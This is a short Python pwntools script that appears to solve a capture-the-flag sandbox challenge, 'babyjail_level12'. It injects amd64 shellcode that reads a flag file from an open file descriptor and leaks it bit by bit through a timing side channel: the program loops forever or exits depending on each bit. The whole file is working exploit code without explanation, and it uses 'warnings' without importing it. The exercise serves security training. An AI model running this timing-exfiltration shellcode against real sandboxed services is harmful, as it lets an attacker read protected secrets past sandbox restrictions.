from pwn import *
import os
import time

context.arch = 'amd64'
context.encoding ='latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')

# iter_progress = log.progress("PROGRESS")
# flag_prog = log.progress("FLAG")
flag = ""

for i in range(3):
    mybytes = ""
    for j in range (6, -1, -1): 

        assembly = asm(f""" 
        mov rdi, 3
        mov rsi, rsp
        mov rdx, 100
        mov rax, 0
        syscall

        xor rax, rax
        mov al, byte ptr[rsp+{i}]
        mov r8, {pow(2, j)}
        and rax, r8
        cmp rax, r8
        jne done 
        loop: 
        jmp loop
        done:

        """)
        start_time = time.time()
        with process(["/challenge/babyjail_level12", "/flag"], alarm=3) as p:
            p.send(assembly)
            p.poll(True)
            
        if time.time()-start_time > 2: 
            mybytes += f"1"
        else:
            mybytes += f"0"

    flag += chr(int(mybytes, 2))
    print(f'flagprog={flag} bytes{mybytes}')

print(flag)